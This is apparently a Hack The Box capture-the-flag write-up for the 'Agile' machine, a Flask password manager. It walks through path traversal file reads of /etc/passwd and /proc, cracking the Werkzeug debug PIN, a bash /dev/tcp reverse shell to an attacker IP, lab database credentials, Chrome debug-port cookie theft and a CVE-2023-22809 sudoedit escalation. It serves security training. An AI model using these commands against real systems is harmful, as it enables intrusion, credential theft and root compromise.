# HTB: Agile — Writeup

**OS:** Linux
**Difficulty:** Medium
**Techniques:** Path traversal, Werkzeug debug PIN RCE, DB credential reuse, Chrome remote-debug session theft, CVE-2023-22809 sudoedit

---

## Synopsis

Agile is a Medium Linux machine hosting *SuperPass*, a Flask-based web password manager. The CSV export feature redirects to a `/download?fn=` endpoint vulnerable to path traversal, giving arbitrary file read as `www-data`. A malformed request crashes the app into the Werkzeug interactive debugger — debug mode is on — and the file-read primitive is used to recover every value needed to compute the debugger console PIN, yielding RCE. The app's MySQL credentials lead to the vault database, where `corum`'s stored password is reused as his system password (SSH). `corum` can read the test harness, which runs a Selenium/headless-Chrome suite with a fixed remote-debugging port; tunnelling to it and attaching via `chrome://inspect` exposes `edwards`' authenticated session cookie, which is replayed against the internal dev instance to recover `edwards`' vault password. Finally, `edwards` has a `sudoedit` rule as `dev_admin`, and sudo 1.9.9 is vulnerable to CVE-2023-22809; the `EDITOR` variable is abused to edit `/app/venv/bin/activate` — sourced by root's login shell — planting a SUID `bash` for root.

## Skills Required

- Web enumeration and framework fingerprinting (Flask)
- Path traversal / arbitrary file read
- Understanding of the Werkzeug debugger PIN algorithm
- SSH port forwarding
- Basic knowledge of the Chrome DevTools Protocol
- Matching software versions to CVEs

## Skills Learned

- Deriving a Werkzeug debug PIN from host values obtained via file read (including the Gunicorn/`wsgi_app` quirk)
- Turning a headless-Chrome remote debugging port into session-cookie theft
- Exploiting CVE-2023-22809 (sudoedit `EDITOR` argument injection)
- Abusing a login-sourced file to escalate when root logs in asynchronously

---

## Enumeration

### Nmap

```
└──╼ [★]$ nmap -p- 10.129.228.212
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

└──╼ [★]$ nmap -p22,80 -sCV 10.129.228.212 -oA nmap/Agile
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: SuperPassword 🦸
```

Port 80 redirects to `superpass.htb`, added to `/etc/hosts`.

### HTTP (80) — SuperPass

SuperPass is a browser-based password manager with register/login. A 404 matched Flask's default error page, fingerprinting the stack as **Flask**. After registering, the vault (`/vault`) lets a user store generated passwords and **export them to CSV**.

![SuperPass browser-based password manager landing page with login and register options](images/agile_superpass-landing-login.png)

![SuperPass vault showing saved password entries with generate/edit/export options](images/agile_vault-saved-passwords.png)

---

## Foothold

### Path traversal in `/download?fn=`

The CSV export (`/vault/export`) redirects to `/download?fn=<file>`. The `fn` parameter is used to build a filesystem path without sanitisation, so directory traversal yields arbitrary file read as the web user:

```
└──╼ [★]$ curl "http://superpass.htb/download?fn=../../../../../../../../etc/passwd" -s --path-as-is -b $cookie
```

Users with login shells: `edwards`, `dev_admin`, `runner`, `corum`, `root`.

### Werkzeug debug console PIN → RCE

Pointing `fn` at a **directory** throws `IsADirectoryError`, rendered inside the full Werkzeug traceback page — confirming Flask **debug mode** is on and exposing the interactive debugger console (PIN-protected).

![Werkzeug interactive debugger traceback (IsADirectoryError) with the console PIN prompt, confirming Flask debug mode](images/agile_werkzeug-debug-console.png)

Werkzeug derives the PIN deterministically from a set of host values, all reachable through the file-read primitive:

- `username` — the app runs as `www-data`
- `modname` — `flask.app`
- app name — **`wsgi_app`** (the app runs under Gunicorn, so this is *not* `Flask`)
- Flask `app.py` path — `/app/venv/lib/python3.10/site-packages/flask/app.py` (seen in the traceback)
- MAC address of `eth0` → `uuid.getnode()` (read `/sys/class/net/eth0/address`, converted to a decimal int; `/proc/net/arp` confirms the interface)
- machine id → `/etc/machine-id` plus the cgroup line from `/proc/self/cgroup` (`0::/system.slice/superpass.service`)

```
└──╼ [★]$ curl "http://superpass.htb/download?fn=../../../../../../../../proc/net/arp" -s --path-as-is -b $cookie
10.129.0.1  0x1  0x2  00:50:56:94:9b:51  *  eth0
└──╼ [★]$ curl "http://superpass.htb/download?fn=../../../../../../../../etc/machine-id" ...
└──╼ [★]$ curl "http://superpass.htb/download?fn=../../../../../../../../proc/self/cgroup" ...
0::/system.slice/superpass.service
```

> 💡 Three details broke the stock PIN recipe: newer Werkzeug uses **SHA1** (not MD5); the app name is **`wsgi_app`** because it runs under Gunicorn (not `Flask`); and the username is `www-data`. With those corrected the computed PIN unlocked the console.

With the console unlocked, a reverse shell was launched (single line to satisfy the console's evaluator):

```python
import os; os.system('bash -c "bash -i >& /dev/tcp/10.10.15.60/1337 0>&1"')
```

A shell returned as `www-data`. (This shell recycles roughly every 5 minutes, so the next steps were done quickly.)

---

## Lateral Movement

### www-data → corum (DB credential reuse)

`/app/config_prod.json` holds the MySQL URI:

```
(venv) www-data@agile:/app$ cat config_prod.json
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
```

The reverse shell is not a TTY, so the interactive `mysql>` prompt returns nothing — queries were run non-interactively with `-e`. The `passwords` table is the vault store:

```
mysql> select * from passwords;
| id | url          | username | password             | user_id |
|  8 | agile        | corum    | 5db7caa1d13cc37c9fc2 |       2 |
...
```

`corum`'s stored "agile" password is reused as his system password:

```
└──╼ [★]$ ssh corum@superpass.htb
corum@agile:~$ cat user.txt
```

`user.txt` retrieved.

### corum → edwards (Chrome remote-debug session theft)

`corum` can read `/app/app-testing`. A root cron job runs `test_and_update.sh`, which executes a Selenium functional test driving **headless Chrome** with a fixed `--remote-debugging-port=41829` (bound to localhost). The test logs into the internal dev site (`test.superpass.htb`, served on `127.0.0.1:5555`) as `edwards`.

Forwarding the debug port over SSH and attaching with `chrome://inspect` during a test run exposes the live, authenticated session:

```
└──╼ [★]$ ssh -L 41829:localhost:41829 corum@superpass.htb
```

![Chrome DevTools (chrome://inspect) attached to the test suite's headless Chrome on test.superpass.htb, Application tab showing the logged-in user's session cookie](images/agile_chrome-devtools-edwards-session-cookie.png)

The session cookie was copied from DevTools → Application → Cookies. Forwarding `5555` as well, the cookie was injected into the browser against `http://localhost:5555` to authenticate as `edwards` and open his vault, which contained his password:

```
└──╼ [★]$ ssh -L 5555:localhost:5555 corum@superpass.htb
```

`edwards`' password works over SSH.

---

## Privilege Escalation

### CVE-2023-22809 — sudoedit EDITOR argument injection

```
edwards@agile:~$ sudo -l
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
edwards@agile:~$ sudo --version
Sudo version 1.9.9
```

sudo 1.9.9 is vulnerable to **CVE-2023-22809**: if the `EDITOR`/`SUDO_EDITOR` variable contains `--` followed by another path, sudoedit appends that file to its edit list, letting the user edit *any* file as the target user. A file that is both writable by `dev_admin` and executed by root is `/app/venv/bin/activate` — it is sourced from `/etc/bash.bashrc`, so it runs in root's login shell (root logs in periodically):

```
edwards@agile:/app/venv/bin$ EDITOR='vi -- /app/venv/bin/activate' sudoedit -u dev_admin /app/config_test.json
3 files to edit
```

Inside the editor, two lines were inserted near the top of `activate` to copy `bash` to `/tmp/dark` and set it SUID root:

```bash
# This file must be used with "source bin/activate" *from bash*
# you cannot run it directly

cp /bin/bash /tmp/dark
chmod 4777 /tmp/dark

deactivate () {
...
```

When root's next login sourced the file, the SUID binary was created; running it with `-p` (so bash keeps the elevated euid) gave root:

```
edwards@agile:/tmp$ ./dark -p
edwards@agile:/tmp# id
uid=1002(edwards) gid=1002(edwards) euid=0(root) groups=1002(edwards)
edwards@agile:/root# cat root.txt
```

`root.txt` retrieved.

---

## Summary of Techniques

| Stage | Technique |
|---|---|
| Enumeration | Nmap; Flask fingerprint; mapped SuperPass vault export/download |
| Foothold | Path traversal in `/download?fn=` → arbitrary file read → Werkzeug debug console PIN (SHA1, `wsgi_app`/Gunicorn, `www-data`) → RCE as www-data |
| Lateral (www-data → corum) | MySQL creds from `config_prod.json`; vault password reused as corum's SSH password |
| Lateral (corum → edwards) | Test suite's headless-Chrome remote-debug port (41829) → `chrome://inspect` session cookie theft → replay on `:5555` → edwards vault password |
| PrivEsc | sudoedit as dev_admin + CVE-2023-22809 → edit `/app/venv/bin/activate` (sourced by root) → SUID root bash |

---

## Lessons / Takeaways

- An arbitrary file read is far more than `/etc/passwd` — here it supplied *every* input to the Werkzeug PIN, converting a read primitive into full RCE.
- Werkzeug PIN "recipes" online are version-specific. When a PIN fails, suspect the hash (MD5 vs SHA1), the app name (`Flask` vs `wsgi_app` under Gunicorn), and the exact username. Running a local copy of the app to print the real values is the sure way.
- Password managers concentrate reuse: a stored vault entry is very often the owner's real account password.
- A debug/remote-control port bound to localhost is still reachable by any local user — and over SSH forwarding, by you. Headless test browsers hold live authenticated sessions.
- `sudoedit` rules look narrow but CVE-2023-22809 widens them to any file. The real escalation came from picking a target root would later *source*, not the files the rule named.
